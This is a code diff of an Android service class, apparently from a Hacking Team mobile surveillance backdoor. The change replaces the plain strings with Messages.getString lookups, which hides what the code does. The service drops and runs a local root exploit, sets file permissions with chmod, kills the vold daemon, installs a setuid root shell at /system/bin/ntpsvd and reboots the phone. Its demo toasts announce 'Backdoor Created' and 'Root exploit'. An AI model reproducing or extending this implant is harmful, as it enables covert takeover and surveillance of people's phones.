@@ -18,7 +18,6 @@ import android.graphics.Bitmap.Config;
 import android.graphics.Canvas;
 import android.graphics.Paint;
 import android.os.IBinder;
-import android.util.Log;
 import android.view.Display;
 import android.view.WindowManager;
 import android.widget.Toast;
@@ -32,8 +31,7 @@ import com.android.service.util.Utils;
  * The Class ServiceCore.
  */
 public class ServiceCore extends Service {
-	private static final String TAG = "ServiceCore";
-
+	private static final String TAG = "ServiceCore"; //$NON-NLS-1$
 	private Core core;
 	private String shellFile;
 
@@ -46,10 +44,10 @@ public class ServiceCore extends Service {
 	public void onCreate() {
 		super.onCreate();
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " (onCreate)");
+			Check.log(TAG + " (onCreate)"); //$NON-NLS-1$
 		}
 		if (Cfg.DEMO) {
-			Toast.makeText(this, "Backdoor Created", Toast.LENGTH_LONG).show();
+			Toast.makeText(this, Messages.getString("ServiceCore.1"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
 			// setBackground();
 		}
 		Status.setAppContext(getApplicationContext());
@@ -67,7 +65,7 @@ public class ServiceCore extends Service {
 		paint.setStyle(Paint.Style.FILL);
 		paint.setAntiAlias(true);
 		paint.setTextSize(20);
-		canvas.drawText("HackingTeam", 10, 100, paint);
+		canvas.drawText(Messages.getString("ServiceCore.0"), 10, 100, paint); //$NON-NLS-1$
 		try {
 			wm.setBitmap(bitmap);
 		} catch (final IOException e) {
@@ -81,11 +79,11 @@ public class ServiceCore extends Service {
 	public void onDestroy() {
 		super.onDestroy();
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " (onDestroy)");
+			Check.log(TAG + " (onDestroy)"); //$NON-NLS-1$
 		}
 
 		if (Cfg.DEMO) {
-			Toast.makeText(this, "Backdoor Destroyed", Toast.LENGTH_LONG).show();
+			Toast.makeText(this, Messages.getString("ServiceCore.3"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
 		}
 		core.Stop();
 		core = null;
@@ -95,9 +93,9 @@ public class ServiceCore extends Service {
 	public void onStart(Intent intent, int startId) {
 		super.onStart(intent, startId);
 
-		this.shellFile = "/system/bin/ntpsvd";
+		this.shellFile = Messages.getString("ServiceCore.2"); //$NON-NLS-1$
 
-		if (checkRoot() == true) {
+		if (checkRoot() == true) { 
 			Status.self().setRoot(true);
 		} else {
 			Status.self().setRoot(false);
@@ -107,7 +105,7 @@ public class ServiceCore extends Service {
 				Status.self().setRoot(root());
 			} else {
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (onStart) no media mounted");
+					Check.log(TAG + " (onStart) no media mounted"); //$NON-NLS-1$
 				}
 			}
 		}
@@ -122,15 +120,15 @@ public class ServiceCore extends Service {
 		try {
 			if (!Cfg.EXP) {
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (root): Exploit disabled by conf");
+					Check.log(TAG + " (root): Exploit disabled by conf"); //$NON-NLS-1$
 				}
 
 				return false;
 			}
 
-			final String crashlog = "errorlog";
-			final String exploit = "statuslog";
-			final String suidext = "statusdb";
+			final String crashlog = Messages.getString("ServiceCore.4"); //$NON-NLS-1$
+			final String exploit = Messages.getString("ServiceCore.5"); //$NON-NLS-1$
+			final String suidext = Messages.getString("ServiceCore.6"); //$NON-NLS-1$
 			boolean isRoot = false;
 
 			// Creiamo il crashlog
@@ -163,11 +161,11 @@ public class ServiceCore extends Service {
 			final File filesPath = getApplicationContext().getFilesDir();
 			final String path = filesPath.getAbsolutePath();
 
-			Runtime.getRuntime().exec("/system/bin/chmod 755 " + path + "/" + exploit);
-			Runtime.getRuntime().exec("/system/bin/chmod 755 " + path + "/" + suidext);
-			Runtime.getRuntime().exec("/system/bin/chmod 666 " + path + "/" + crashlog);
+			Runtime.getRuntime().exec(Messages.getString("ServiceCore.7") + path + "/" + exploit); //$NON-NLS-1$ //$NON-NLS-2$
+			Runtime.getRuntime().exec(Messages.getString("ServiceCore.8") + path + "/" + suidext); //$NON-NLS-1$ //$NON-NLS-2$
+			Runtime.getRuntime().exec(Messages.getString("ServiceCore.9") + path + "/" + crashlog); //$NON-NLS-1$ //$NON-NLS-2$
 
-			final String exppath = path + "/" + exploit;
+			final String exppath = path + "/" + exploit; //$NON-NLS-1$
 
 			final ExploitRunnable r = new ExploitRunnable(exppath);
 			new Thread(r).start();
@@ -190,34 +188,34 @@ public class ServiceCore extends Service {
 
 			if (isRoot) {
 				// Killiamo VOLD per due volte
-				Runtime.getRuntime().exec(path + "/" + suidext + " vol");
+				Runtime.getRuntime().exec(path + "/" + suidext + Messages.getString("ServiceCore.10")); //$NON-NLS-1$ //$NON-NLS-2$
 
 				// Installiamo la shell root
-				Runtime.getRuntime().exec(path + "/" + suidext + " rt");
+				Runtime.getRuntime().exec(path + "/" + suidext + Messages.getString("ServiceCore.11")); //$NON-NLS-1$ //$NON-NLS-2$
 
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (onStart): Root exploit");
+					Check.log(TAG + " (onStart): Root exploit"); //$NON-NLS-1$
 				}
 				if (Cfg.DEMO) {
-					Toast.makeText(this, "Root exploit", Toast.LENGTH_LONG).show();
+					Toast.makeText(this, Messages.getString("ServiceCore.12"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
 				}
 
 				// Riavviamo il telefono
-				Runtime.getRuntime().exec(path + "/" + suidext + " reb");
+				Runtime.getRuntime().exec(path + "/" + suidext + " reb"); //$NON-NLS-1$ //$NON-NLS-2$
 			} else {
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (onStart): exploit failed!");
+					Check.log(TAG + " (onStart): exploit failed!"); //$NON-NLS-1$
 				}
 				if (Cfg.DEMO) {
-					Toast.makeText(this, "exploit failed!", Toast.LENGTH_LONG).show();
+					Toast.makeText(this, Messages.getString("ServiceCore.13"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
 				}
 
 			}
 		} catch (final Exception e1) {
 
 			if (Cfg.DEBUG) {
-				Check.log(e1);
-				Check.log(TAG + " (root): Exception on root()");
+				Check.log(e1) ;//$NON-NLS-1$
+				Check.log(TAG + " (root): Exception on root()"); //$NON-NLS-1$
 			}
 			return false;
 		}
@@ -225,19 +223,19 @@ public class ServiceCore extends Service {
 		return true;
 	}
 
-	private boolean checkRoot() {
+	private boolean checkRoot() { //$NON-NLS-1$
 		boolean isRoot = false;
 
 		try {
 			// Verifichiamo di essere root
 			final AutoFile file = new AutoFile(shellFile);
 			if (file.exists() && file.canRead()) {
-				final Process p = Runtime.getRuntime().exec(shellFile + " air");
+				final Process p = Runtime.getRuntime().exec(shellFile + Messages.getString("ServiceCore.14")); //$NON-NLS-1$
 				p.waitFor();
 
 				if (p.exitValue() == 1) {
 					if (Cfg.DEBUG) {
-						Log.d("QZ", TAG + " (checkRoot): isRoot YEAHHHHH");
+						Check.log( TAG + " (checkRoot): isRoot YEAHHHHH"); //$NON-NLS-1$ //$NON-NLS-2$
 					}
 
 					isRoot = true;
@@ -245,7 +243,7 @@ public class ServiceCore extends Service {
 			}
 		} catch (final Exception e) {
 			if (Cfg.DEBUG) {
-				Check.log(e);
+				Check.log(e) ;//$NON-NLS-1$
 			}
 		}
 
@@ -277,13 +275,13 @@ public class ServiceCore extends Service {
 
 				while ((line = stdout.readLine()) != null) {
 					if (Cfg.DEBUG) {
-						Check.log(TAG + " (stdout): " + line);
+						Check.log(TAG + " (stdout): " + line); //$NON-NLS-1$
 					}
 				}
 
 				while ((line = stderr.readLine()) != null) {
 					if (Cfg.DEBUG) {
-						Check.log(TAG + " (stderr): " + line);
+						Check.log(TAG + " (stderr): " + line); //$NON-NLS-1$
 					}
 				}
 
@@ -291,14 +289,14 @@ public class ServiceCore extends Service {
 					localProcess.waitFor();
 				} catch (final InterruptedException e) {
 					if (Cfg.DEBUG) {
-						Check.log(TAG + " (waitFor): " + e);
-						Check.log(e);
+						Check.log(TAG + " (waitFor): " + e); //$NON-NLS-1$
+						Check.log(e) ;//$NON-NLS-1$
 					}
 				}
 
 				final int exitValue = localProcess.exitValue();
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (waitFor): exitValue " + exitValue);
+					Check.log(TAG + " (waitFor): exitValue " + exitValue); //$NON-NLS-1$
 				}
 
 				stdin.close();
@@ -308,8 +306,8 @@ public class ServiceCore extends Service {
 			} catch (final IOException e) {
 				localProcess = null;
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (ExploitRunnable): Exception on run(): " + e);
-					Check.log(e);
+					Check.log(TAG + " (ExploitRunnable): Exception on run(): " + e); //$NON-NLS-1$
+					Check.log(e) ;//$NON-NLS-1$
 				}
 			}
 		}
